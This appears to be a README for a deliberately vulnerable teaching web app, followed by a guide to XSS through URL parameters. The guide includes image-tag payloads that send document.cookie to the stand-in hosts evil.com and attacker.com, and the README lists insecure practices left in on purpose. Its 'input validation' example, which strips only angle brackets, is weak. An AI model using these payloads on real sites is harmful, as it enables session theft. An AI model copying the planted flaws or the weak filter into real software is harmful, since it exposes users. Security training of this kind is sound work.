# VULN-STACK

## Application Overview

`Vuln-Stack` is a deliberately vulnerable full-stack web application designed for educational and testing purposes. It demonstrates common web security flaws, including Cross-Site Scripting (XSS), insecure authentication, and improper input validation. The stack typically includes a React frontend, Node.js/Express backend, and a MongoDB database.

## Features

- **User Authentication:** Simple login and registration forms with intentionally weak validation.
- **Profile Management:** Users can update profile information, exposing potential injection points.
- **Message Board:** Public posting feature vulnerable to XSS and CSRF attacks.
- **API Endpoints:** RESTful routes for user and message management, lacking proper authorization checks.

## Architecture

- **Frontend:** React application with routing and state management. User input is rendered directly into the DOM in several places.
- **Backend:** Express server handling authentication, data storage, and API requests. Input is often processed without sanitization.
- **Database:** MongoDB stores user and message data. Queries are constructed without parameterization, exposing NoSQL injection risks.

## Known Vulnerabilities

1. **Cross-Site Scripting (XSS):**
    - User input is rendered without escaping.
    - Use of `dangerouslySetInnerHTML` in React components.
2. **Cross-Site Request Forgery (CSRF):**
    - No CSRF tokens implemented for state-changing requests.
3. **Broken Authentication:**
    - Passwords stored in plaintext.
    - Sessions managed with insecure cookies.
4. **NoSQL Injection:**
    - User input directly used in MongoDB queries.
5. **Sensitive Data Exposure:**
    - No HTTPS enforced.
    - JWT secrets and database credentials hardcoded.

## Setup Instructions

1. **Clone the Repository:**
    ```bash
    git clone https://github.com/lightmnd/vuln-stack.git
    cd vuln-stack
    ```
2. **Install Dependencies:**
    ```bash
    npm install
    cd client && npm install
    ```
3. **Configure Environment:**
    - Edit `.env` files for backend and frontend.
    - Set MongoDB URI and JWT secret.
4. **Run the Application:**
    ```bash
    npm run dev
    cd client && npm start
    ```

## Usage

- Register a new user and log in.
- Post messages to the board.
- Edit your profile and observe how input is handled.
- Experiment with attack payloads to understand vulnerabilities.

## Security Recommendations

- Sanitize and validate all user input.
- Use HTTPS for all communications.
- Store passwords securely (hashing and salting).
- Implement CSRF protection.
- Avoid exposing sensitive configuration in source code.
- Use parameterized queries for database access.

## Disclaimer

This application is intentionally insecure and should only be used in isolated, non-production environments for learning and testing purposes.



# FOCUS-ON: XSS Attack Vector: URL Parameter Injection

## Overview
This document explains how attackers can exploit URL parameters to inject malicious code through image tags, using the example from our vulnerable React application.

## Vulnerable Code Example
```javascript
<a href="https://my-bank.example.com/welcome?user=<img src=x onerror=alert('hello!')>"></a>
```

## How the Attack Works

1. **Initial Vulnerable Link**
   - The application accepts unvalidated user input in URL parameters
   - Parameters are rendered directly into the HTML without proper encoding

2. **Attack Payload**
   - Attacker injects HTML/JavaScript through the URL parameter
   - The malicious `<img>` tag is inserted with an invalid source
   - When the image fails to load, the `onerror` event triggers
   - Malicious JavaScript executes in the victim's browser context

3. **Common Attack Variations**
   ```html
   // Basic XSS
   <img src="x" onerror="alert(document.cookie)">
   
   // Data theft
   <img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
   
   // Session hijacking
   <img src="x" onerror="new Image().src='http://attacker.com/'+document.cookie">
   ```

## Prevention Methods

### 1. URL Parameter Encoding
```javascript
<a href={`https://my-bank.example.com/welcome?user=${encodeURIComponent(username)}`}>
  Welcome
</a>
```

### 2. Content Security Policy
```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; img-src 'self' https:; script-src 'self'"
  );
  next();
});
```

### 3. Input Validation
```javascript
const validateInput = (input) => {
  return input.replace(/[<>]/g, '');
};
```

## Security Best Practices

1. Never trust user input
2. Always encode/escape output
3. Implement CSP headers
4. Use React's built-in XSS protections
5. Avoid using `dangerouslySetInnerHTML`
6. Validate input on both client and server side
7. Use secure cookie attributes (HttpOnly, Secure, SameSite)

## Impact of Successful Attacks
- Cookie theft
- Session hijacking
- Data exfiltration
- Malicious redirects
- Client-side malware injection

## Testing Tools
- Browser Developer Tools
- OWASP ZAP
- Burp Suite
- XSS Hunter

## Additional Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [React Security Documentation](https://reactjs.org/docs/dom-elements.html#security-concerns)
- [Content Security Policy Reference](https://content-security-policy.com/)

## Note
This documentation is for educational purposes only. The vulnerable code examples should never be used in production environments.